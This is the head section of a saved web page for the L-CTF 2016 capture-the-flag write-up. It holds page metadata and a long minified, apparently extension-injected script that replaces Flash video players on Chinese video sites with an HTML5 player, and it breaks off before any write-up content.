<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- saved from url=(0039)http://bobao.360.cn/ctf/detail/170.html -->
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1">
    <link rel="alternate" title="安全资讯" href="http://bobao.360.cn/rss?type=news" type="application/rss+xml">
    <link rel="alternate" title="安全知识" href="http://bobao.360.cn/rss?type=learning" type="application/rss+xml">
    <link rel="alternate" title="安全圈活动" href="http://bobao.360.cn/rss?type=activity" type="application/rss+xml">
    <link rel="alternate" title="所有漏洞" href="http://bobao.360.cn/rss?type=vul" type="application/rss+xml">
    <link rel="alternate" title="通用型漏洞" href="http://bobao.360.cn/rss?type=commonvul" type="application/rss+xml">
    <link rel="alternate" title="事件型漏洞" href="http://bobao.360.cn/rss?type=eventvul" type="application/rss+xml">
    <link rel="alternate" title="热门漏洞" href="http://bobao.360.cn/rss?type=hotvul" type="application/rss+xml">

        <title>【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体</title>
    
    	<meta name="keywords" content="L-CTF,Writeup,ctf,CTF攻略">
    
        <meta name="description" content="L-CTF由西电信息安全协会（XDSEC）承办的网络安全赛事。比赛旨在贴近实战、提升技术，重点考察计算机网络攻防的知识技能，提高选手针对实际问题进行网络攻防的能力，并从中发现人才。">
    	<meta property="wb:webmaster" content="224437c7be31d633">
    
    <script type="text/javascript" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/xpc_sync_height.js"></script><style type="text/css" adt="123"></style>
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/reset.css">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/common_new.css">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/jquery.notyfy.css">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/notyfy.theme.default.css">
    <link rel="stylesheet" type="text/css" href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/s_common.css" media="only screen and (max-device-width:900px), only screen and (max-width:900px)">
    <script type="text/javascript" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/jquery.min.js"></script>
    <script type="text/javascript" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/jquery.notyfy.js"></script>
    <script type="text/javascript" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/iscroll.js"></script>
    <script src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/5.0.3.js"></script><link type="text/css" rel="stylesheet" href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/ae29e96d7cf6e1b4.css"><script charset="utf-8" src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/7f227a1745d42fbb.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded(){
            myScroll = new IScroll('#wrapper',
              {
                scrollX: true,
                scrollY: false,
                bounceEasing: 'circular',
                eventPassthrough: true,
                preventDefault: false,
                bounceTime: 500
              }
            );
        }

        $(function(){

            //导航横向滚动
            

            function setNavWidth(){

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if(allWidth > 900){
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if(myNavScroll) myNavScroll.destroy();
                }else{

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function(index, el) {
                        if(!$(this).hasClass('mobile-hide')){
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
                    
                    if(myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true          
                    });

                }

            }
            setNavWidth();
            $(window).resize(function(event) {
                setNavWidth();
            });

        });

    </script>
<script>!
    function e(t, n, i) {
        function o(a, s) {
            if (!n[a]) {
                if (!t[a]) {
                    var l = "function" == typeof require && require;
                    if (!s && l) return l(a, !0);
                    if (r) return r(a, !0);
                    var c = new Error("Cannot find module '" + a + "'");
                    throw c.code = "MODULE_NOT_FOUND",
                        c
                }
                var d = n[a] = {
                    exports: {}
                };
                t[a][0].call(d.exports, function (e) {
                    var n = t[a][1][e];
                    return o(n ? n : e)
                }, d, d.exports, e, t, n, i)
            }
            return n[a].exports
        }
        for (var r = "function" == typeof require && require, a = 0; a < i.length; a++) o(i[a]);
        return o
    }({
        1: [function (e) {
            var t = window.location.href,
                n = document.createElement("div"),
                i = document.createElement("i");
            if (i.setAttribute("id", "ADT-PlayHTML5-btn"), i.innerText = "HTML5\u89c6\u9891", i.setAttribute("style", "display:inline-block;font-size: 20px;padding:5px 10px;font-weight: 700;line-height:34px;color: #fff;text-align: center;vertical-align: baseline;border-radius:10px;background-color: #428bca;cursor: pointer;font-style: normal;"), n.setAttribute("style", "float:right;margin-top:-50px;width:300px;height:50px;padding-top:8px;"), n.appendChild(i), /v\.youku\.com\/v_show\/.*/.test(t)) document.querySelector(".s_main div.base").appendChild(n);
            else if (/www\.tudou\.com\/(albumplay|programs)\/.*/.test(t)) document.querySelector("#summary").appendChild(n);
            else if (/www\.mgtv\.com\/v\/.*/.test(t)) {
                var i = document.createElement("i"),
                    o = document.createElement("div"),
                    r = document.createElement("em");
                i.setAttribute("style", "display:inline-block;margin:auto 20px;cursor:pointer;"),
                    i.innerText = "HTML5\u89c6\u9891",
                    r.innerText = "|",
                    r.setAttribute("class", "v-panel-dividing"),
                    o.setAttribute("style", "margin-right: 10px;height: 28px;overflow: hidden;position: relative;top: -1px;float: left;"),
                    o.appendChild(r),
                    o.appendChild(i),
                    document.querySelector("div.v-panel-box").appendChild(o)
            }
            i.addEventListener("click", function () {
                function t(e, t) {
                    if (!e) return console.log("\u89e3\u6790\u5185\u5bb9\u5730\u5740\u5931\u8d25"),
                        void delete window[s];
                    console.log("\u89e3\u6790\u5185\u5bb9\u5730\u5740\u5b8c\u6210" + e.map(function (e) {
                            return '<a href="' + e[1] + '" target="_blank">' + e[0] + "</a>"
                        }).join(" "));
                    var n = o("div", {
                        appendTo: document.body,
                        style: {
                            position: "fixed",
                            background: "rgba(0,0,0,0.8)",
                            top: "0",
                            left: "0",
                            width: "100%",
                            height: "100%",
                            zIndex: "999999"
                        }
                    });
                    o("div", {
                        appendTo: n,
                        style: {
                            width: "1120px",
                            height: "630px",
                            position: "absolute",
                            top: "40%",
                            left: "50%",
                            marginTop: "-250px",
                            marginLeft: "-560px",
                            borderRadius: "2px",
                            boxShadow: "0 0 2px #000000, 0 0 200px #000000"
                        }
                    }),
                        o("div", {
                            appendTo: n,
                            style: {
                                position: "absolute",
                                bottom: "10px",
                                left: "0",
                                right: "0",
                                height: "20px",
                                lineHeight: "20px",
                                textAlign: "center",
                                fontSize: "12px",
                                fontFamily: "arial, sans-serif"
                            }
                        });
                    var a = o("div", {
                        appendTo: n,
                        innerHTML: '<div id="html5_Player_placeHolder"></div>',
                        style: {
                            width: "1120px",
                            height: "630px",
                            position: "absolute",
                            backgroundColor: "#000000",
                            top: "40%",
                            left: "50%",
                            marginTop: "-250px",
                            marginLeft: "-560px",
                            borderRadius: "2px",
                            overflow: "hidden"
                        }
                    });
                    o("div", {
                        appendTo: a,
                        innerHTML: "&times;",
                        style: {
                            width: "20px",
                            height: "20px",
                            lineHeight: "20px",
                            textAlign: "center",
                            position: "absolute",
                            color: "#ffffff",
                            fontSize: "20px",
                            top: "5px",
                            right: "5px",
                            textShadow: "0 0 2px #000000",
                            fontWeight: "bold",
                            fontFamily: 'Garamond, "Apple Garamond"',
                            cursor: "pointer"
                        }
                    }).onclick = function () {
                        document.body.removeChild(n),
                            l.video.src = "about:blank",
                            delete window[s]
                    };
                    var l = new r("html5_Player_placeHolder", "1120x630", e, t);
                    l.iframe.contentWindow.focus(),
                        i(),
                        l.iframe.style.display = "block",
                        window[s] = !0
                }
                var n, i = e("./flashBlocker"),
                    o = e("./createElement"),
                    r = e("./player"),
                    a = e("./purl"),
                    s = e("./h5key"),
                    l = e("./seekers");
                if (1 != window[s]) {
                    var c = a(location.href);
                    "zythum.sinaapp.com" === c.attr("host") && "/mama2/ps4/" === c.attr("directory") && c.param("url") && (c = a(c.param("url"))),
                        l.forEach(function (e) {
                            n !== !0 && !! e.match(c) == !0 && (console.log("\u5f00\u59cb\u89e3\u6790\u5185\u5bb9\u5730\u5740"), n = !0, e.getVideos(c, t))
                        }),
                    void 0 === n && console.log("\u627e\u4e0d\u5230\u89e3\u6790")
                }
            })
        },
            {
                "./createElement": 4,
                "./flashBlocker": 5,
                "./h5key": 6,
                "./player": 9,
                "./purl": 10,
                "./seekers": 15
            }],
        2: [function (e, t) {
            function n(e, t) {
                return void 0 === e ? t : e
            }
            function i(e, t) {
                return 0 === t.length ? e : e + (-1 === e.indexOf("?") ? "?" : "&") + t
            }
            function o(e) {
                var t = n(e.url, ""),
                    o = s(n(e.param, {})),
                    l = n(e.method, "GET"),
                    c = n(e.callback, a),
                    d = n(e.contentType, "json"),
                    u = n(e.context, null);
                if (e.jsonp) return r(i(t, o), c.bind(u), "string" == typeof e.jsonp ? e.jsonp : void 0);
                var h = new XMLHttpRequest;
                "get" === l.toLowerCase() && (t = i(t, o), o = ""),
                    h.open(l, t, !0),
                    h.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"),
                    h.send(o),
                    h.onreadystatechange = function () {
                        if (4 === h.readyState) {
                            if (200 === h.status) {
                                var e = h.responseText;
                                if ("json" === d.toLowerCase()) try {
                                    e = JSON.parse(e)
                                } catch (t) {
                                    e = -1
                                }
                                return c.call(u, e)
                            }
                            return c.call(u, -1)
                        }
                    }
            }
            var r = e("./jsonp"),
                a = e("./noop"),
                s = e("./queryString");
            t.exports = o
        },
            {
                "./jsonp": 7,
                "./noop": 8,
                "./queryString": 11
            }],
        3: [function (e, t) {
            t.exports = !! document.createElement("video").canPlayType("application/x-mpegURL")
        },
            {}],
        4: [function (e, t) {
            function n(e, t) {
                var n = document.createElement(e);
                if ("function" == typeof t) t.call(n);
                else for (var i in t) if (t.hasOwnProperty(i)) switch (i) {
                    case "appendTo":
                        t[i].appendChild(n);
                        break;
                    case "innerHTML":
                    case "className":
                    case "id":
                        n[i] = t[i];
                        break;
                    case "style":
                        var o = t[i];
                        for (var r in o) o.hasOwnProperty(r) && (n.style[r] = o[r]);
                        break;
                    default:
                        n.setAttribute(i, t[i] + "")
                }
                return n
            }
            t.exports = n
        },
            {}],
        5: [function (e, t) {
            var n = '<div style="text-shadow:0 0 2px #eee;letter-spacing:-1px;background:#eee;font-weight:bold;padding:0;font-family:arial,sans-serif;font-size:30px;color:#ccc;width:152px;height:52px;border:4px solid #ccc;border-radius:12px;position:absolute;top:50%;left:50%;margin:-30px 0 0 -80px;text-align:center;line-height:52px;">Flash</div>',
                i = 0,
                o = {},
                r = function () {
                    var e = this.getAttribute("data-flash-index"),
                        t = o[e];
                    t.setAttribute("data-flash-show", "isshow"),
                        this.parentNode.insertBefore(t, this),
                        this.parentNode.removeChild(this),
                        this.removeEventListener("click", r, !1)
                },
                a = function (e, t, a) {
                    var s = i++,
                        l = document.defaultView.getComputedStyle(e, null),
                        c = l.position;
                    c = "static" === c ? "relative" : c;
                    var d = l.margin,
                        u = "inline" == l.display ? "inline-block" : l.display,
                        l = ["", "width:" + t + "px", "height:" + a + "px", "position:" + c, "margin:" + d, "display:" + u, "margin:0", "padding:0", "border:0", "border-radius:1px", "cursor:pointer", "background:-webkit-linear-gradient(top, rgba(240,240,240,1)0%,rgba(220,220,220,1)100%)", ""];
                    o[s] = e;
                    var h = document.createElement("div");
                    return h.setAttribute("title", "&#x70B9;&#x6211;&#x8FD8;&#x539F;Flash"),
                        h.setAttribute("data-flash-index", "" + s),
                        e.parentNode.insertBefore(h, e),
                        e.parentNode.removeChild(e),
                        h.addEventListener("click", r, !1),
                        h.style.cssText += l.join(";"),
                        h.innerHTML = n,
                        h
                },
                s = function (e) {
                    if (e instanceof HTMLObjectElement) {
                        if ("" == e.innerHTML.trim()) return;
                        if (e.getAttribute("classid") && !/^java:/.test(e.getAttribute("classid"))) return
                    } else if (!(e instanceof HTMLEmbedElement)) return;
                    var t = e.offsetWidth,
                        n = e.offsetHeight;
                    t > 160 && n > 60 && a(e, t, n)
                };
            t.exports = function () {
                for (var e = document.getElementsByTagName("embed"), t = document.getElementsByTagName("object"), n = 0, i = t.length; i > n; n++) t[n] && s(t[n]);
                for (var n = 0, i = e.length; i > n; n++) e[n] && s(e[n])
            }
        },
            {}],
        6: [function (e, t) {
            t.exports = "html5playerforadblockyouknowwhatimean"
        },
            {}],
        7: [function (e, t) {
            function n() {
                return a + s++
            }
            function i(e, t, i) {
                i = i || "callback";
                var a = n();
                window[a] = function (e) {
                    clearTimeout(s),
                        window[a] = r,
                        t(e),
                        document.body.removeChild(c)
                };
                var s = setTimeout(function () {
                        window[a](-1)
                    }, l),
                    c = o("script", {
                        appendTo: document.body,
                        src: e + (e.indexOf("?") >= 0 ? "&" : "?") + i + "=" + a
                    })
            }
            var o = e("./createElement"),
                r = e("./noop"),
                a = "MAMA2_HTTP_JSONP_CALLBACK",
                s = 0,
                l = 1e4;
            t.exports = i
        },
            {
                "./createElement": 4,
                "./noop": 8
            }],
        8: [function (e, t) {
            t.exports = function () {}
        },
            {}],
        9: [function (e, t) {
            var n;
            !
                function i(t, n, o) {
                    function r(s, l) {
                        if (!n[s]) {
                            if (!t[s]) {
                                var c = "function" == typeof e && e;
                                if (!l && c) return c(s, !0);
                                if (a) return a(s, !0);
                                throw new Error("Cannot find module '" + s + "'")
                            }
                            var d = n[s] = {
                                exports: {}
                            };
                            t[s][0].call(d.exports, function (e) {
                                var n = t[s][1][e];
                                return r(n ? n : e)
                            }, d, d.exports, i, t, n, o)
                        }
                        return n[s].exports
                    }
                    for (var a = "function" == typeof e && e, s = 0; s < o.length; s++) r(o[s]);
                    return r
                }({
                    1: [function (e, t) {
                        function n(e) {
                            for (var t = [], n = 1; n < arguments.length; n++) {
                                var o = arguments[n],
                                    r = o.init;
                                t.push(r),
                                    delete o.init,
                                    i(e.prototype, o)
                            }
                            e.prototype.init = function () {
                                t.forEach(function (e) {
                                    e.call(this)
                                }.bind(this))
                            }
                        }
                        var i = e("./extend");
                        t.exports = n
                    },
                        {
                            "./extend": 9
                        }],
                    2: [function (e, t) {
                        var n = e("./player.css"),
                            i = e("./player.html"),
                            o = (e("./extend"), e("./createElement")),
                            r = e("./parseDOMByClassNames");
                        t.exports = {
                            init: function () {
                                var e = function () {
                                        var e = this.iframe.contentDocument.getElementsByTagName("head")[0],
                                            t = this.iframe.contentDocument.body;
                                        o("style", function () {
                                            e.appendChild(this);
                                            try {
                                                this.styleSheet.cssText = n
                                            } catch (t) {
                                                this.appendChild(document.createTextNode(n))
                                            }
                                        }),
                                            o("link", {
                                                appendTo: e,
                                                href: "http://libs.cncdn.cn/font-awesome/4.3.0/css/font-awesome.min.css",
                                                rel: "stylesheet",
                                                type: "text/css"
                                            }),
                                            t.innerHTML = i,
                                            this.DOMs = r(t, ["player", "video", "video-frame", "comments", "comments-btn", "play", "progress_anchor", "buffered_anchor", "fullscreen", "allscreen", "hd", "volume_anchor", "current", "duration"]),
                                            this.video = this.DOMs.video
                                    }.bind(this),
                                    t = document.getElementById(this.id),
                                    a = this.iframe = o("iframe", {
                                        allowTransparency: !0,
                                        frameBorder: "no",
                                        scrolling: "no",
                                        src: "about:blank",
                                        mozallowfullscreen: "mozallowfullscreen",
                                        webkitallowfullscreen: "webkitallowfullscreen",
                                        allowfullscreen: "allowfullscreen",
                                        style: {
                                            width: this.size[0] + "px",
                                            height: this.size[1] + "px",
                                            overflow: "hidden"
                                        }
                                    });
                                t && t.parentNode ? (t.parentNode.replaceChild(a, t), e()) : (document.body.appendChild(a), e(), document.body.removeChild(a))
                            }
                        }
                    },
                        {
                            "./createElement": 7,
                            "./extend": 9,
                            "./parseDOMByClassNames": 11,
                            "./player.css": 12,
                            "./player.html": 13
                        }],
                    3: [function (e, t) {
                        function n(e) {
                            e.strokeStyle = "black",
                                e.lineWidth = 3,
                                e.font = 'bold 20px "PingHei","Lucida Grande", "Lucida Sans Unicode", "STHeiti", "Helvetica","Arial","Verdana","sans-serif"'
                        }
                        var i = (e("./createElement"), .1),
                            o = 25,
                            r = 4e3,
                            a = document.createElement("canvas").getContext("2d");
                        n(a);
                        var s = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame ||
                            function (e) {
                                setTimeout(e, 1e3 / 60)
                            };
                        t.exports = {
                            init: function () {
                                this.video.addEventListener("play", this.reStartComment.bind(this)),
                                    this.video.addEventListener("pause", this.pauseComment.bind(this)),
                                    this.lastCommnetUpdateTime = 0,
                                    this.lastCommnetIndex = 0,
                                    this.commentLoopPreQueue = [],
                                    this.commentLoopQueue = [],
                                    this.commentButtonPreQueue = [],
                                    this.commentButtonQueue = [],
                                    this.commentTopPreQueue = [],
                                    this.commentTopQueue = [],
                                    this.drawQueue = [],
                                    this.preRenders = [],
                                    this.preRenderMap = {},
                                    this.enableComment = void 0 === this.comments ? !1 : !0,
                                    this.prevDrawCanvas = document.createElement("canvas"),
                                    this.canvas = this.DOMs.comments.getContext("2d"),
                                this.comments && this.DOMs.player.classList.add("has-comments"),
                                    this.DOMs["comments-btn"].classList.add("enable"),
                                    this.DOMs.comments.display = this.enableComment ? "block" : "none";
                                var e = 0,
                                    t = function () {
                                        (e = ~e) && this.onCommentTimeUpdate(),
                                            s(t)
                                    }.bind(this);
                                t()
                            },
                            needDrawText: function (e, t, n) {
                                this.drawQueue.push([e, t, n])
                            },
                            drawText: function () {
                                var e = this.prevDrawCanvas,
                                    t = this.prevDrawCanvas.getContext("2d");
                                e.width = this.canvasWidth,
                                    e.height = this.canvasHeight,
                                    t.clearRect(0, 0, this.canvasWidth, this.canvasHeight);
                                var i = [];
                                this.preRenders.forEach(function (e, t) {
                                    e.used = !1,
                                    void 0 === e.cid && i.push(t)
                                });
                                for (var r; r = this.drawQueue.shift();)!
                                    function (e, r) {
                                        var a, s = e[0].text + e[0].color,
                                            l = r.preRenderMap[s];
                                        if (void 0 === l) {
                                            var l = i.shift();
                                            void 0 === l ? (a = document.createElement("canvas"), l = r.preRenders.push(a) - 1) : a = r.preRenders[l];
                                            var c = a.width = e[0].width,
                                                d = a.height = o + 10,
                                                u = a.getContext("2d");
                                            u.clearRect(0, 0, c, d),
                                                n(u),
                                                u.fillStyle = e[0].color,
                                                u.strokeText(e[0].text, 0, o),
                                                u.fillText(e[0].text, 0, o),
                                                a.cid = s,
                                                r.preRenderMap[s] = l
                                        } else a = r.preRenders[l];
                                        a.used = !0,
                                            t.drawImage(a, e[1], e[2])
                                    }(r, this);
                                this.preRenders.forEach(function (e) {
                                    e.used === !1 && (delete this.preRenderMap[e.cid], e.cid = void 0)
                                }.bind(this)),
                                    this.canvas.clearRect(0, 0, this.canvasWidth, this.canvasHeight),
                                    this.canvas.drawImage(e, 0, 0)
                            },
                            createComment: function (e, t) {
                                if (void 0 === e) return !1;
                                var n = a.measureText(e.text);
                                return {
                                    startTime: t,
                                    text: e.text,
                                    color: e.color,
                                    width: n.width + 20
                                }
                            },
                            commentTop: function (e, t, n) {
                                this.commentTopQueue.forEach(function (t, i) {
                                    void 0 != t && (n > t.startTime + r ? this.commentTopQueue[i] = void 0 : this.needDrawText(t, (e - t.width) / 2, o * i))
                                }.bind(this));
                                for (var i; i = this.commentTopPreQueue.shift();) i = this.createComment(i, n),
                                    this.commentTopQueue.forEach(function (t, n) {
                                        i && void 0 === t && (t = this.commentTopQueue[n] = i, this.needDrawText(t, (e - i.width) / 2, o * n), i = void 0)
                                    }.bind(this)),
                                i && (this.commentTopQueue.push(i), this.needDrawText(i, (e - i.width) / 2, o * this.commentTopQueue.length - 1))
                            },
                            commentBottom: function (e, t, n) {
                                t -= 10,
                                    this.commentButtonQueue.forEach(function (i, a) {
                                        void 0 != i && (n > i.startTime + r ? this.commentButtonQueue[a] = void 0 : this.needDrawText(i, (e - i.width) / 2, t - o * (a + 1)))
                                    }.bind(this));
                                for (var i; i = this.commentButtonPreQueue.shift();) i = this.createComment(i, n),
                                    this.commentButtonQueue.forEach(function (n, r) {
                                        i && void 0 === n && (n = this.commentButtonQueue[r] = i, this.needDrawText(n, (e - i.width) / 2, t - o * (r + 1)), i = void 0)
                                    }.bind(this)),
                                i && (this.commentButtonQueue.push(i), this.needDrawText(i, (e - i.width) / 2, t - o * this.commentButtonQueue.length))
                            },
                            commentLoop: function (e, t, n) {
                                for (var r = t / o | 0, a = -1; ++a < r;) {
                                    var s = this.commentLoopQueue[a];
                                    if (void 0 === s && (s = this.commentLoopQueue[a] = []), this.commentLoopPreQueue.length > 0) {
                                        var l = 0 === s.length ? void 0 : s[s.length - 1];
                                        if (void 0 === l || (n - l.startTime) * i > l.width) {
                                            var c = this.createComment(this.commentLoopPreQueue.shift(), n);
                                            c && s.push(c)
                                        }
                                    }
                                    this.commentLoopQueue[a] = s.filter(function (t) {
                                        var r = (n - t.startTime) * i;
                                        return 0 > r || r > t.width + e ? !1 : (this.needDrawText(t, e - r, o * a), !0)
                                    }.bind(this))
                                }
                                for (var d = this.commentLoopQueue.length - r; d-- > 0;) this.commentLoopQueue.pop()
                            },
                            pauseComment: function () {
                                this.pauseCommentAt = Date.now()
                            },
                            reStartComment: function () {
                                if (this.pauseCommentAt) {
                                    var e = Date.now() - this.pauseCommentAt;
                                    this.commentLoopQueue.forEach(function (t) {
                                        t.forEach(function (t) {
                                            t && (t.startTime += e)
                                        })
                                    }),
                                        this.commentButtonQueue.forEach(function (t) {
                                            t && (t.startTime += e)
                                        }),
                                        this.commentTopQueue.forEach(function (t) {
                                            t && (t.startTime += e)
                                        })
                                }
                                this.pauseCommentAt = void 0
                            },
                            drawComment: function () {
                                if (!this.pauseCommentAt) {
                                    var e = Date.now(),
                                        t = this.DOMs["video-frame"].offsetWidth,
                                        n = this.DOMs["video-frame"].offsetHeight;
                                    t != this.canvasWidth && (this.DOMs.comments.width = t, this.canvasWidth = t),
                                    n != this.canvasHeight && (this.DOMs.comments.height = n, this.canvasHeight = n);
                                    var i = this.video.offsetWidth,
                                        o = this.video.offsetHeight;
                                    this.commentLoop(i, o, e),
                                        this.commentTop(i, o, e),
                                        this.commentBottom(i, o, e),
                                        this.drawText()
                                }
                            },
                            onCommentTimeUpdate: function () {
                                if (this.enableComment !== !1) {
                                    var e = this.video.currentTime;
                                    if (Math.abs(e - this.lastCommnetUpdateTime) <= 1 && e > this.lastCommnetUpdateTime) {
                                        var t = 0;
                                        for (this.lastCommnetIndex && this.comments[this.lastCommnetIndex].time <= this.lastCommnetUpdateTime && (t = this.lastCommnetIndex); ++t < this.comments.length;) if (!(this.comments[t].time <= this.lastCommnetUpdateTime)) {
                                            if (this.comments[t].time > e) break;
                                            switch (this.comments[t].pos) {
                                                case "bottom":
                                                    this.commentButtonPreQueue.push(this.comments[t]);
                                                    break;
                                                case "top":
                                                    this.commentTopPreQueue.push(this.comments[t]);
                                                    break;
                                                default:
                                                    this.commentLoopPreQueue.push(this.comments[t])
                                            }
                                            this.lastCommnetIndex = t
                                        }
                                    }
                                    try {
                                        this.drawComment()
                                    } catch (n) {}
                                    this.lastCommnetUpdateTime = e
                                }
                            }
                        }
                    },
                        {
                            "./createElement": 7
                        }],
                    4: [function (e, t) {
                        function n(e) {
                            return Array.prototype.slice.call(e)
                        }
                        function i(e, t, n, i) {
                            function o(t) {
                                var n = (t.clientX - e.parentNode.getBoundingClientRect().left) / e.parentNode.offsetWidth;
                                return Math.min(Math.max(n, 0), 1)
                            }
                            function r(t) {
                                1 == t.which && (l = !0, e.draging = !0, a(t))
                            }
                            function a(e) {
                                if (1 == e.which && l === !0) {
                                    var t = o(e);
                                    n(t)
                                }
                            }
                            function s(t) {
                                if (1 == t.which && l === !0) {
                                    var r = o(t);
                                    n(r),
                                        i(r),
                                        l = !1,
                                        delete e.draging
                                }
                            }
                            var l = !1;
                            n = n ||
                                function () {},
                                i = i ||
                                    function () {},
                                e.parentNode.addEventListener("mousedown", r),
                                t.addEventListener("mousemove", a),
                                t.addEventListener("mouseup", s)
                        }
                        var o = (e("./createElement"), e("./delegateClickByClassName")),
                            r = e("./timeFormat");
                        t.exports = {
                            init: function () {
                                var e = this.iframe.contentDocument,
                                    t = o(e);
                                t.on("play", this.onPlayClick, this),
                                    t.on("video-frame", this.onVideoClick, this),
                                    t.on("source", this.onSourceClick, this),
                                    t.on("allscreen", this.onAllScreenClick, this),
                                    t.on("fullscreen", this.onfullScreenClick, this),
                                    t.on("normalscreen", this.onNormalScreenClick, this),
                                    t.on("comments-btn", this.oncommentsBtnClick, this),
                                    t.on("airplay", this.onAirplayBtnClick, this),
                                    e.documentElement.addEventListener("keydown", this.onKeyDown.bind(this), !1),
                                    this.DOMs.player.addEventListener("mousemove", this.onMouseActive.bind(this)),
                                    i(this.DOMs.progress_anchor, e, this.onProgressAnchorWillSet.bind(this), this.onProgressAnchorSet.bind(this)),
                                    i(this.DOMs.volume_anchor, e, this.onVolumeAnchorWillSet.bind(this))
                            },
                            onKeyDown: function (e) {
                                switch (e.preventDefault(), e.keyCode) {
                                    case 32:
                                        this.onPlayClick();
                                        break;
                                    case 39:
                                        this.video.currentTime = Math.min(this.video.duration, this.video.currentTime + 10);
                                        break;
                                    case 37:
                                        this.video.currentTime = Math.max(0, this.video.currentTime - 10);
                                        break;
                                    case 38:
                                        this.video.volume = Math.min(1, this.video.volume + .1),
                                            this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%";
                                        break;
                                    case 40:
                                        this.video.volume = Math.max(0, this.video.volume - .1),
                                            this.DOMs.volume_anchor.style.width = 100 * this.video.volume + "%";
                                        break;
                                    case 65:
                                        this.DOMs.player.classList.contains("allscreen") ? this.onNormalScreenClick() : this.onAllScreenClick();
                                        break;
                                    case 70:
                                        this.DOMs.player.classList.contains("fullscreen") || this.onfullScreenClick()
                                }
                            },
                            onVideoClick: function () {
                                void 0 == this.videoClickDblTimer ? this.videoClickDblTimer = setTimeout(function () {
                                    this.videoClickDblTimer = void 0,
                                        this.onPlayClick()
                                }.bind(this), 300) : (clearTimeout(this.videoClickDblTimer), this.videoClickDblTimer = void 0, document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement ? this.onNormalScreenClick() : this.onfullScreenClick())
                            },
                            onMouseActive: function () {
                                this.DOMs.player.classList.add("active"),
                                    clearTimeout(this.MouseActiveTimer),
                                    this.MouseActiveTimer = setTimeout(function () {
                                        this.DOMs.player.classList.remove("active")
                                    }.bind(this), 1e3)
                            },
                            onPlayClick: function () {
                                this.DOMs.play.classList.contains("paused") ? (this.video.play(), this.DOMs.play.classList.remove("paused")) : (this.video.pause(), this.DOMs.play.classList.add("paused"))
                            },
                            onSourceClick: function (e) {
                                e.classList.contains("curr") || (this.video.preloadStartTime = this.video.currentTime, this.video.src = this.sourceList[0 | e.getAttribute("sourceIndex")][1], n(e.parentNode.childNodes).forEach(function (t) {
                                    e === t ? t.classList.add("curr") : t.classList.remove("curr")
                                }.bind(this)))
                            },
                            onProgressAnchorWillSet: function (e) {
                                var t = this.video.duration,
                                    n = t * e;
                                this.DOMs.current.innerHTML = r(n),
                                    this.DOMs.duration.innerHTML = r(t),
                                    this.DOMs.progress_anchor.style.width = 100 * e + "%"
                            },
                            onProgressAnchorSet: function (e) {
                                this.video.currentTime = this.video.duration * e
                            },
                            onVolumeAnchorWillSet: function (e) {
                                this.video.volume = e,
                                    this.DOMs.volume_anchor.style.width = 100 * e + "%"
                            },
                            onAllScreenClick: function () {
                                var e = document.documentElement.clientWidth,
                                    t = document.documentElement.clientHeight;
                                this.iframe.style.cssText = ";position:fixed;top:0;left:0;width:" + e + "px;height:" + t + "px;z-index:999999;",
                                    this.allScreenWinResizeFunction = this.allScreenWinResizeFunction ||
                                        function () {
                                            this.iframe.style.width = document.documentElement.clientWidth + "px",
                                                this.iframe.style.height = document.documentElement.clientHeight + "px"
                                        }.bind(this),
                                    window.removeEventListener("resize", this.allScreenWinResizeFunction),
                                    window.addEventListener("resize", this.allScreenWinResizeFunction),
                                    this.DOMs.player.classList.add("allscreen")
                            },
                            onfullScreenClick: function () {
                                ["webkitRequestFullScreen", "mozRequestFullScreen", "requestFullScreen"].forEach(function (e) {
                                    this.DOMs.player[e] && this.DOMs.player[e]()
                                }.bind(this)),
                                    this.onMouseActive()
                            },
                            onNormalScreenClick: function () {
                                window.removeEventListener("resize", this.allScreenWinResizeFunction),
                                    this.iframe.style.cssText = ";width:" + this.size[0] + "px;height:" + this.size[1] + "px;",
                                    ["webkitCancelFullScreen", "mozCancelFullScreen", "cancelFullScreen"].forEach(function (e) {
                                        document[e] && document[e]()
                                    }),
